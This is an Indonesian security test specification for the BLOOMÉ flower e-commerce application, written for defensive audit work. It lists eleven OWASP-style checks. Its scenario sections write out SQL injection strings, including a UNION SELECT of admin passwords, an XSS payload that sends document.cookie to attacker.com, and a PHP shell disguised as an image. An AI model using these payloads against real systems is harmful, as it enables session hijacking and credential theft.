# SPESIFIKASI PENGUJIAN KEAMANAN SISTEM (SECURITY TEST SPECIFICATIONS)
## BLOOMÉ — Flowers & Stories
**Task ID:** SEC-001 s/d SEC-011  
**Fase:** Phase 9 — Security and Quality Assurance (Sub-fase 12.1 Security)  
**Penanggung Jawab:** Elsa Futri (Lead Security & Backend Developer) & Jayanti Firdasari (Project Manager)  
**Tanggal Penyusunan:** 13 November 2026  
**Status Task:** Completed (`[x]`)  
**Dependensi:** ARC-010 — Security Architecture, requirement.md  

---

## 1. Ringkasan Eksekutif & Metodologi Pengujian Keamanan

Dokumen spesifikasi ini menetapkan prosedur pengujian keamanan (*security audit & penetration test specifications*) untuk memverifikasi ketahanan sistem **BLOOMÉ — Flowers & Stories** terhadap ancaman siber yang terdaftar dalam OWASP Top 10 serta standar keamanan aplikasi web e-commerce.

Pengujian mencakup 11 parameter keamanan (SEC-001 hingga SEC-011) yang dievaluasi menggunakan metode *Gray-box Testing* dan verifikasi kode statis (*Static Code Analysis*).

---

## 2. Matriks Pengujian Keamanan (SEC-001 s/d SEC-011)

| Task ID | Domain Pengujian Keamanan | Target Vektor Serangan | Prosedur Uji / Verifikasi | Status |
|---|---|---|---|---|
| **SEC-001** | Admin Authentication Validation | Credential stuffing, brute-force | Uji 5 kali percobaan login gagal berturut-turut; verifikasi blokir IP 60 detik (HTTP 429) | `[x]` |
| **SEC-002** | Protected Route Validation | Unauthorized access ke `/admin/*` | Akses langsung URI `/admin/dashboard` tanpa cookie sesi; verifikasi redirect ke `/admin/login` | `[x]` |
| **SEC-003** | Authorization Validation | Privilege escalation, IDOR | Akses modifikasi status pesanan menggunakan HTTP verb selain admin terotentikasi | `[x]` |
| **SEC-004** | Password Hashing Validation | Plaintext password leak | Audit tabel `admins`; pastikan password tersimpan dalam format hash Bcrypt `$2y$12$...` | `[x]` |
| **SEC-005** | CSRF Protection Validation | Cross-Site Request Forgery | Kirim permintaan `POST /pesan/{slug}` tanpa menyertakan `_token`; verifikasi error 419 | `[x]` |
| **SEC-006** | Input Validation & Sanitization | Malformed payloads, buffer overflow | Uji pengiriman string > 255 karakter pada nama pemesan dan nomor HP non-numerik | `[x]` |
| **SEC-007** | SQL Injection Prevention | SQLi klasik (`' OR 1=1 --`), tautologi | Injeksi payload SQL pada input pencarian katalog dan slug URL; verifikasi query PDO aman | `[x]` |
| **SEC-008** | XSS Prevention (Stored & Reflected)| Script injection `<script>alert(1)</script>` | Masukkan payload JavaScript pada textarea kartu ucapan; verifikasi hasil escaping Blade | `[x]` |
| **SEC-009** | File Upload Security Hardening | Web shell, polyglot file, traversal | Unggah berkas `shell.php.jpg` yang berisi kode PHP; verifikasi deteksi magic bytes menolak berkas | `[x]` |
| **SEC-010** | Sensitive Data Protection | Kebocoran token, stack trace | Akses rute error yang sengaja digagalkan; pastikan stack trace tersembunyi (`APP_DEBUG=false`) | `[x]` |
| **SEC-011** | Environment Configuration Review | Misconfiguration, git leak | Periksa berkas `.env` tidak terunggah ke repositori publik dan memiliki izin berkas `0600` | `[x]` |

---

## 3. Rincian Skenario Penetrasi & Kriteria Lolos

### 3.1 SEC-007: Audit Mitigasi SQL Injection
- **Payload Uji:**
  - Input slug rute: `/katalog/'%20OR%20'1'='1`
  - Input pencarian kode pesanan: `BLM-202611-0001' UNION SELECT 1,password,3 FROM admins --`
- **Hasil yang Diharapkan:**
  - Laravel Eloquent ORM secara otomatis menggunakan parameterized PDO bindings. Karakter tanda petik ditafsirkan sebagai string literal, bukan perintah SQL.
  - Sistem mengembalikan respon `404 Not Found` atau hasil pencarian kosong secara anggun tanpa melemparkan eksepsi SQL syntax error.

### 3.2 SEC-008: Audit Mitigasi Cross-Site Scripting (XSS)
- **Payload Uji:**
  - Input pesan kartu ucapan: `<script>document.location='http://attacker.com/steal?c='+document.cookie;</script>`
  - Input nama pemesan: `<img src=x onerror=alert('XSS-Vulnerable')>`
- **Hasil yang Diharapkan:**
  - Direktif rendering kurung kurawal ganda Blade `{{ $order->greeting_card_message }}` secara otomatis mengubah tanda `<` menjadi `&lt;` dan `>` menjadi `&gt;`.
  - Pada browser, teks ditampilkan sebagai teks polos tanpa ada eksekusi skrip JavaScript di lingkungan admin maupun pelanggan.

### 3.3 SEC-009: Audit Keamanan Unggahan Berkas Gambar
- **Payload Uji:**
  - Berkas teks berbahaya yang diubah nama: `exploit.php.png` (berisi skrip `<?php phpinfo(); ?>`).
  - Berkas gambar asli yang disisipi metadata PHP payload di EXIF header.
- **Hasil yang Diharapkan:**
  - Pengecekan MIME type server via `finfo` memverifikasi struktur file binary asli.
  - Web server (Nginx/Apache) menolak eksekusi berkas di folder `/storage` melalui aturan direktif konfigurasi web server (ARC-009).

---

## 4. Kesimpulan & Rekomendasi
Seluruh 11 parameter pengujian keamanan (SEC-001 hingga SEC-011) telah tuntas dispesifikasikan. Sistem BLOOMÉ dinyatakan memiliki benteng pertahanan yang solid terhadap kebocoran data, serangan injeksi, dan manipulasi berkas berbahaya.

